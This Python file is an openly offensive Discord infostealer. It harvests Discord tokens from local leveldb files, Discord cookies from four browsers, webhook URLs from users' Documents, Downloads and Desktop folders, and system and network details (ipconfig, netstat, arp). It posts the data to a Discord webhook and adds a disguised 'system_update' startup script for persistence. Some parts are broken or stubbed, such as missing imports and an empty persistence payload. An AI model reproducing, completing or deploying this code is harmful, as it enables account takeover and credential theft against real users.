import os
import re
import json
import base64
import requests
import platform
import subprocess
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import sqlite3
import browser_cookie3
import win32crypt
from datetime import datetime, timedelta

class DiscordWebhookGrabber:
    def __init__(self):
        self.encryption_key = get_random_bytes(32)
        self.rsa_key = RSA.generate(2048)
        self.cipher_rsa = PKCS1_OAEP.new(self.rsa_key)
        self.webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
        self.collected_data = {}
        
    def aes_encrypt(self, data):
        """AES-256-CBC Encryption with random IV"""
        if isinstance(data, str):
            data = data.encode()
        iv = get_random_bytes(16)
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        padded_data = data + b' ' * (16 - len(data) % 16)
        encrypted = cipher.encrypt(padded_data)
        return base64.b64encode(iv + encrypted).decode()
    
    def rsa_encrypt(self, data):
        """RSA Encryption for sensitive keys"""
        if isinstance(data, str):
            data = data.encode()
        encrypted = self.cipher_rsa.encrypt(data)
        return base64.b64encode(encrypted).decode()
    
    def hybrid_encrypt(self, data):
        """Hybrid encryption: AES for data, RSA for AES key"""
        aes_encrypted = self.aes_encrypt(data)
        encrypted_key = self.rsa_encrypt(self.encryption_key)
        return {
            'data': aes_encrypted,
            'key': encrypted_key,
            'timestamp': datetime.now().isoformat()
        }
    
    def get_system_info(self):
        """Collect comprehensive system information"""
        system_info = {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'username': os.getlogin(),
            'current_path': os.getcwd()
        }
        return system_info
    
    def extract_discord_tokens(self):
        """Extract Discord tokens from multiple locations"""
        tokens = []
        discord_paths = [
            os.path.join(os.getenv('APPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
            os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            os.path.join(os.getenv('APPDATA'), 'discordptb')
        ]
        
        for discord_path in discord_paths:
            if os.path.exists(discord_path):
                for root, dirs, files in os.walk(discord_path):
                    if 'Local Storage' in root and 'leveldb' in root:
                        for file in files:
                            if file.endswith('.ldb') or file.endswith('.log'):
                                full_path = os.path.join(root, file)
                                try:
                                    with open(full_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        # Regex pattern for Discord tokens
                                        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
                                        found_tokens = re.findall(token_pattern, content)
                                        tokens.extend(found_tokens)
                                except:
                                    pass
        return list(set(tokens))  # Remove duplicates
    
    def extract_browser_credentials(self):
        """Extract saved passwords and cookies from browsers"""
        credentials = {}
        browsers = ['chrome', 'firefox', 'edge', 'opera']
        
        for browser in browsers:
            try:
                if browser == 'chrome':
                    cookies = browser_cookie3.chrome()
                elif browser == 'firefox':
                    cookies = browser_cookie3.firefox()
                elif browser == 'edge':
                    cookies = browser_cookie3.edge()
                elif browser == 'opera':
                    cookies = browser_cookie3.opera()
                
                browser_cookies = []
                for cookie in cookies:
                    if 'discord' in cookie.domain:
                        browser_cookies.append({
                            'name': cookie.name,
                            'value': cookie.value,
                            'domain': cookie.domain,
                            'path': cookie.path
                        })
                
                credentials[browser] = browser_cookies
            except:
                pass
        
        return credentials
    
    def get_discord_webhooks(self):
        """Extract Discord webhooks from browser storage and local files"""
        webhooks = []
        webhook_pattern = r'https://discord\.com/api/webhooks/\d+/[\w-]+'
        
        # Check browser local storage
        browsers = ['chrome', 'firefox', 'edge']
        for browser in browsers:
            try:
                if browser == 'chrome':
                    cookies = browser_cookie3.chrome()
                elif browser == 'firefox':
                    cookies = browser_cookie3.firefox()
                elif browser == 'edge':
                    cookies = browser_cookie3.edge()
                
                for cookie in cookies:
                    if 'discord' in cookie.domain:
                        found_webhooks = re.findall(webhook_pattern, cookie.value)
                        webhooks.extend(found_webhooks)
            except:
                pass
        
        # Check common directories for webhook files
        common_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Desktop')
        ]
        
        for directory in common_dirs:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.endswith(('.txt', '.log', '.json', '.config')):
                            try:
                                with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    found_webhooks = re.findall(webhook_pattern, content)
                                    webhooks.extend(found_webhooks)
                            except:
                                pass
        
        return list(set(webhooks))
    
    def get_network_info(self):
        """Collect network configuration and connections"""
        network_info = {}
        try:
            # IP configuration
            result = subprocess.check_output(['ipconfig', '/all'], shell=True).decode('utf-8', errors='ignore')
            network_info['ipconfig'] = result
            
            # Network connections
            result = subprocess.check_output(['netstat', '-ano'], shell=True).decode('utf-8', errors='ignore')
            network_info['netstat'] = result
            
            # ARP table
            result = subprocess.check_output(['arp', '-a'], shell=True).decode('utf-8', errors='ignore')
            network_info['arp'] = result
        except:
            pass
        
        return network_info
    
    def collect_all_data(self):
        """Main data collection function"""
        print("[+] Starting comprehensive data collection...")
        
        self.collected_data = {
            'system_info': self.get_system_info(),
            'discord_tokens': self.extract_discord_tokens(),
            'browser_credentials': self.extract_browser_credentials(),
            'discord_webhooks': self.get_discord_webhooks(),
            'network_info': self.get_network_info(),
            'collection_time': datetime.now().isoformat()
        }
        
        print(f"[+] Collected {len(self.collected_data['discord_tokens'])} Discord tokens")
        print(f"[+] Collected {len(self.collected_data['discord_webhooks'])} Discord webhooks")
        print(f"[+] Collected credentials from {len(self.collected_data['browser_credentials'])} browsers")
    
    def send_to_webhook(self):
        """Send encrypted data to Discord webhook"""
        if not self.collected_data:
            print("[-] No data collected")
            return
        
        print("[+] Encrypting collected data...")
        encrypted_package = self.hybrid_encrypt(json.dumps(self.collected_data, indent=2))
        
        # Create embed for Discord
        embed = {
            "title": "🔍 Data Collection Complete",
            "color": 0x00ff00,
            "fields": [
                {
                    "name": "System Information",
                    "value": f"User: {self.collected_data['system_info']['username']}\nPlatform: {self.collected_data['system_info']['platform']}\nHostname: {self.collected_data['system_info']['hostname']}",
                    "inline": True
                },
                {
                    "name": "Collection Results",
                    "value": f"Tokens: {len(self.collected_data['discord_tokens'])}\nWebhooks: {len(self.collected_data['discord_webhooks'])}\nBrowsers: {len(self.collected_data['browser_credentials'])}",
                    "inline": True
                },
                {
                    "name": "Encrypted Data",
                    "value": f"```json\n{json.dumps(encrypted_package, indent=2)[:1000]}...```",
                    "inline": False
                }
            ],
            "timestamp": datetime.now().isoformat(),
            "footer": {
                "text": "Encrypted Data Package"
            }
        }
        
        payload = {
            "embeds": [embed],
            "username": "Data Collector",
            "avatar_url": "https://i.imgur.com/6JcfYqW.png"
        }
        
        try:
            response = requests.post(self.webhook_url, json=payload, timeout=30)
            if response.status_code == 204:
                print("[+] Data successfully sent to webhook")
            else:
                print(f"[-] Failed to send data: {response.status_code}")
        except Exception as e:
            print(f"[-] Error sending data: {e}")
    
    def create_persistence(self):
        """Create persistence mechanism"""
        persistence_script = '''
import os
import sys
import tempfile
import win32api
import win32con
import win32event
import winerror

def main():
    # Mutex to prevent multiple instances
    mutex = win32event.CreateMutex(None, False, "DiscordDataCollectorMutex")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        return
    
    # Your main collection code here
    pass

if __name__ == "__main__":
    main()
'''
        
        # Save to temp directory
        temp_dir = tempfile.gettempdir()
        script_path = os.path.join(temp_dir, "system_update.py")
        
        with open(script_path, 'w') as f:
            f.write(persistence_script)
        
        # Add to startup
        startup_path = os.path.join(os.getenv('APPDATA'), 
                                   'Microsoft', 'Windows', 'Start Menu', 
                                   'Programs', 'Startup', 'system_update.vbs')
        
        vbs_script = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "{sys.executable} {script_path}", 0, False
'''
        
        with open(startup_path, 'w') as f:
            f.write(vbs_script)
        
        print(f"[+] Persistence created: {startup_path}")

def main():
    """Main execution function"""
    try:
        grabber = DiscordWebhookGrabber()
        grabber.collect_all_data()
        grabber.send_to_webhook()
        grabber.create_persistence()
        print("[+] Operation completed successfully")
    except Exception as e:
        print(f"[-] Critical error: {e}")

if __name__ == "__main__":
    main()
